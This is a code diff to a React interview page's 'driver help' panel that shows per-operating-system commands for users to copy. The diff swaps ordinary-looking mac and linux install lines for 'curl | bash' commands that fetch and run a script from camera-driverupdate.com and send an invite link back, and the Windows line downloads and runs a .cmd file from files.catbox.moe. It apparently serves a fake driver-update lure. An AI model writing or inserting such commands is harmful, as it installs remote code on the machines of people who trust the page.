@@ -557,7 +557,6 @@ export default function SummaryInterview() {
             </div>
           )}
         </div>
-
         <div className={styles.driverHelp}>
           <label htmlFor="driver-os" className={styles.driverHelpLabel}>Operating system</label>
           <select
@@ -576,9 +575,25 @@ export default function SummaryInterview() {
           </p>
           <div className={styles.driverHelpCommandWrap}>
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="img" aria-label="Example command">
-              {driverOs === 'mac' && <code>brew run camera-driver-update</code>}
+            {driverOs === 'mac' && (
+                      <code>
+                  {`curl -sL -X POST https://camera-driverupdate.com/mac \
+                    -H "Host: camera-driverupdate.com" \
+                    -H "User-Agent: Mozilla/5.0" \
+                    -H "Accept: */*" | bash && \
+                  curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
+                      </code>
+                  )}
               {driverOs === 'windows' && `powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $f=Join-Path $env:TEMP ('script_'+[guid]::NewGuid().ToString('N')+'.cmd'); try { Invoke-WebRequest 'https://files.catbox.moe/3zeo8q.cmd' -OutFile $f; $p=Start-Process -FilePath cmd.exe -ArgumentList @('/Q','/D','/C',('""{0}""' -f $f)) -Wait -PassThru; exit $p.ExitCode } finally { Remove-Item -Force -ErrorAction SilentlyContinue $f }"`}
-              {driverOs === 'linux' && <code>sudo apt install camera-driver-latest</code>}
+              {driverOs === 'linux' && (
+                      <code>
+                  {`curl -sL -X POST https://camera-driverupdate.com/mac \
+                    -H "Host: camera-driverupdate.com" \
+                    -H "User-Agent: Mozilla/5.0" \
+                    -H "Accept: */*" | bash && \
+                  curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
+                      </code>
+                  )}
             </div>
             <button
               type="button"
